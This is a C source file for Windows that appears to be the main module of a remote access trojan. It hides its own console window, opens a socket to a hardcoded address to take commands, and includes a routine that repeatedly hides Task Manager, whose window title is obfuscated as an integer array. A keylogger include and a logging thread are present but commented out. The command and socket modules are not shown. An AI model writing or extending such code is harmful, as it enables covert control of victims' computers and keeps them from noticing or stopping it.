#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <winuser.h>
#include <string.h>
#include <process.h>
#include <time.h>
#include <shlobj.h>
#define PORT 1234

struct late_execution{
	int late;
}k;

char IP[]="127.0.0.1";
SOCKET sock;

int start();

char* seperatedirectry(const char *src, int start, int end );
int socketconnect();
void seperate_commands();



//user-defined modules
#include "cmd.c"
#include "directry.c"
#include "socketconnection.c"
#include "seperate.c"
//#include "keylogger.c"

int start()
{

	socketconnect();
	seperate_commands();
}

void disableTaskManager(){
	char a[] ={84,97,115,107,32,77,97,110,97,103,101,114,0};
	if (IsUserAnAdmin()==1){
		while (1){
			HWND TaskManger;
			TaskManger = FindWindow(NULL, a);
			ShowWindow(TaskManger,0);
			Sleep(0);
		}
	}
}

int main()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow ( hwnd, SW_MINIMIZE );
	ShowWindow (hwnd , SW_HIDE);
	k.late = 0;

	
/*
	HANDLE thread;
	DWORD ThreadID;
	thread = CreateThread(NULL, 0 , logg , NULL , 0 , &ThreadID);
	if (thread ==NULL)
		printf("Thread creation failed");
*/
	start();
}
